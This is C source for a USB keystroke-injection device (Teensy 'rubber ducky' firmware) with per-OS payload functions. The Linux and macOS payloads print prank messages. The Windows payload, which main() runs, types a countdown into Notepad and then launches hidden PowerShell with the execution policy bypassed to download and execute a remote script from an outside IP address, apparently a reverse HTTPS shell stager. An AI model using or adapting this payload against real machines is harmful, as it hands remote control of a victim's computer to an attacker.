#include "ducky.h"
void LinuxPayload(void){
   LinuxCommandRun("xterm -e \"echo kill all humans! ... 01010001 > pwnd && cat pwnd -\"");
};

void WindowsPayload(void){
   WindowsCommandRun("notepad.exe");
   _delay_ms(1000);
   type("Please unplug the usb right now. Otherwise you will be hacked by 5");

   type(".");
   _delay_ms(500);
   type(".");
   _delay_ms(500);
   type("4");
   type(".");
   _delay_ms(500);
   type(".");
   _delay_ms(500);
   type("3");
   type(".");
   _delay_ms(500);
   type(".");
   _delay_ms(500);
   type("2");
   type(".");
   _delay_ms(500);
   type(".");
   _delay_ms(500);
   type("1");
   type(".");
   _delay_ms(500);
   type(".");
   _delay_ms(500);
   WindowsCommandRun("powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command \"IEX (New-Object Net.WebClient).DownloadString('http://10.13.185.43/rev_https/ps_in.txt')\"");



};

void ApplePayload(void){
   AppleCommandRun("open -a /Applications/TextEdit.app"); // open text editor
   _delay_ms(1000);
   type("hax was here!!! }:)"); // type message
   // or
   AppleCommandRun("echo kill all humans! ... 01010001"); // print a message directly in the terminal
   // run drive finding command
   // i don't own a mac so please feel free to make something up for me
   // also waiting for Darren's USBDucky example code to see if he has gotten around doing this
};

void main(void)
{
   //LED_OFF; // make sure LED is off

   CPU_PRESCALE(0); // set for 16 MHz clock

   // Initialize the USB, and then wait for the host to set configuration.
   // If the Teensy is powered without a PC connected to the USB port,
   // this will wait forever.
   usb_init();
   while (!usb_configured()) /* wait */ ;
   // Wait an extra second for the PC's operating system to load drivers
   // and do whatever it does to actually be ready for input
   _delay_ms(1000);

// DO STUFF ------------------------------------------------------------
   WindowsPayload();

// blink light when done -----------------------------------------------
   blinkLEDLoop(500,500);
}
